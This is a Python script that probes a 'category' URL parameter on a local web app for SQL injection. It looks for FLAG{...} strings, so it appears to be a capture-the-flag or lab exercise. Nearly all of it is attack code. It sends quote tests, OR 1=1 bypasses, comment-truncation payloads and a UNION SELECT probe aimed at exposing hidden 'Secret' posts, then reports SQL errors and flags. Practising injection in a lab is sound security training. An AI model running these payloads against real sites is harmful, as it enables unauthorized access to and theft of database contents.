import requests
import re
from urllib.parse import quote

BASE_URL = "http://127.0.0.1:32860/"

def test_sqli(payload, description):
    """Test SQL injection payload"""
    url = f"{BASE_URL}?category={quote(payload)}"
    
    try:
        response = requests.get(url, timeout=5)
        
        # Quick checks
        has_sql_error = bool(re.search(r"(SQL syntax|sqlite3\.|DatabaseError|syntax error)", response.text, re.IGNORECASE))
        post_count = response.text.count('<article') + response.text.count('<div class="post')
        flags = re.findall(r'FLAG\{[^}]+\}', response.text)
        
        # Print summary line
        status_str = f"[{description}] Status:{response.status_code} Posts:{post_count}"
        if has_sql_error:
            status_str += " [SQL_ERROR]"
        if flags:
            status_str += f" [FLAG:{flags[0]}]"
        
        print(status_str)
        
        # Only print full response if flag found or SQL error
        if flags or has_sql_error:
            print(f"Payload: {payload}")
            print(f"Response:\n{response.text}\n")
        
        return post_count
        
    except Exception as e:
        print(f"[{description}] ERROR: {e}")
        return 0

print("SQL Injection Testing on category parameter\n")

# Baseline
baseline_posts = test_sqli("Technology", "Baseline")

# SQLi tests
test_sqli("'", "Quote test")
test_sqli("' OR '1'='1", "OR bypass 1")
test_sqli("' OR '1'='1'--", "OR bypass 2")
test_sqli("' OR 1=1--", "OR bypass 3")
test_sqli("Secret' OR '1'='1", "Secret OR bypass")
test_sqli("Secret'--", "Secret comment")
test_sqli("' OR category='Secret'--", "Direct Secret")
test_sqli("' UNION SELECT NULL,NULL,NULL--", "UNION test")

print("\nTesting complete")

